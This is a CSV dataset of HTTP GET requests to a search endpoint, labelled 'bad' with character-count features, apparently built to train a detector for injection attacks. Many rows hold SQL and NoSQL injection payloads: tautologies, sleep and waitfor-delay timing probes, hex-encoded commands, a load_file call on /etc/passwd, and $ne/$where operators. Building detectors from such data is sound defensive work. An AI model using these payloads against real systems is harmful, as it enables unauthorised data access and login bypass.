method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=IF(7423=7424)',b'',0,0,0,1,0,0,bad
GET,b'/search.jsp?query=IF(7423=7423)',b'',0,0,0,1,0,0,bad
GET,"b""/search.jsp?query=%'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=%'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=''""",b'',2,0,0,0,0,0,bad
GET,b'/search.jsp?query=`',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=``',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=,'",b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""""'",b'',0,2,0,0,0,0,bad
GET,b'/search.jsp?query=\\',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=\\\\',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=--',b'',0,0,1,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='='""",b'',2,0,0,0,0,0,bad
GET,"b""/search.jsp?query='LIKE'""",b'',2,0,0,0,0,0,bad
GET,"b""/search.jsp?query='=0--+""",b'',1,0,1,0,1,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='''''''''''''UNION""",b'',13,0,0,0,0,1,bad
GET,b'/search.jsp?query=%00',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/*&*/',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=+\t\taddition,'",b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=||\t\t(double',b'',0,0,0,1,0,0,bad
GET,b'/search.jsp?query=%\t\twildcard',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=@variable\tlocal',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=@@variable\tglobal',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=#',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=AND',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=AND',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=AND',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=AND',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1-false',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1-true',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1*56',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=-2',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=-1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=-1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=-1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=Finding',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=Time-Based:',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=,(select'",b'',0,0,0,1,0,1,bad
GET,b'/search.jsp?query=%2c(select%20*%20from%20(select(sleep(10)))a)',b'',0,0,0,4,3,3,bad
GET,"b""/search.jsp?query=';WAITFOR""",b'',1,0,0,0,0,1,bad
GET,b'/search.jsp?query=Comments:',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=#',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/*',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=--',b'',0,0,1,0,0,0,bad
GET,b'/search.jsp?query=;%00\tNullbyte',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=`',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=');""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=?',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query={$gt:',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=[$ne]=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query={',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=',""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=',""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=,'",b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=$where:',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=0',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=031003000270000',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=0x730065006c0065006300740020004000400076006500',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=0x730065006c00650063007400200040004000760065007200730069006f006e00',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=0x770061006900740066006F0072002000640065006C00',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=0x77616974666F722064656C61792027303A303A313027',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=0x77616974666F722064656C61792027303A303A31302700',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=1,'",b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=||',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'1""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1\\'1""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=1;(load_file(char(47,101,116,99,47,112,97,115,'",b'',0,0,0,3,0,0,bad
GET,"b'/search.jsp?query=1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;'",b'',0,0,0,3,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'or'1'='1""",b'',4,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=1or1=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1))',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1))',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='%20%26%26%20this.password.match(/.*/)//+%00""",b'',1,0,0,1,3,0,bad
GET,"b""/search.jsp?query='%20%26%26%20this.passwordzz.match(/.*/)//+%00""",b'',1,0,0,1,3,0,bad
GET,"b""/search.jsp?query=%20or%20''='""",b'',3,0,0,0,2,0,bad
GET,b'/search.jsp?query=%20or%201=1',b'',0,0,0,0,2,0,bad
GET,"b""/search.jsp?query=%20or%20'x'='x""",b'',3,0,0,0,2,0,bad
GET,b'/search.jsp?query=%20or%20x=x',b'',0,0,0,0,2,0,bad
GET,"b""/search.jsp?query=)%20or%20('x'='x""",b'',3,0,0,1,2,0,bad
GET,b'/search.jsp?query=21%',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=23',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=26',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=26%',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=28%',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=29',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=29%',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=3.10E+17',b'',0,0,0,0,1,0,bad
GET,"b""/search.jsp?query='||'6""",b'',2,0,0,0,0,0,bad
GET,b'/search.jsp?query=(||6)',b'',0,0,0,1,0,0,bad
GET,"b""/search.jsp?query=||'6""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=||6',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=a'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=\xc3\xbd',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=admin'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=anything'""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""a""""'",b'',0,3,0,0,0,0,bad
GET,"b'/search.jsp?query=a""'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=a'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=\xe2\x80\x98',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""a""""'",b'',0,3,0,0,0,0,bad
GET,"b'/search.jsp?query=a""""""""'",b'',0,4,0,0,0,0,bad
GET,"b""/search.jsp?query=a'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=\xe2\x80\x98',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=a'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=a'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=db.injection.insert({success:1});',b'',0,0,0,1,0,1,bad
GET,b'/search.jsp?query=db.injection.insert({success:1});return',b'',0,0,0,1,0,1,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=\\';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='||(elt(-3+5,bin(15),ord(10),hex(char(45))))""",b'',1,0,0,6,1,0,bad
GET,"b'/search.jsp?query=||(elt(-3+5,bin(15),ord(10),hex(char(45))))'",b'',0,0,0,6,1,0,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=exec(@s)',b'',0,0,0,1,0,1,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=fake@ema'or'il.nl'='il.nl""",b'',4,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=hi',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""hi"""")'",b'',0,3,0,0,0,0,bad
GET,b'/search.jsp?query=hi',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=hi"""""""")'",b'',0,4,0,0,0,0,bad
GET,"b""/search.jsp?query=hi'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);1""",b'',1,0,0,3,2,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=#NAME?',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=\x18',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
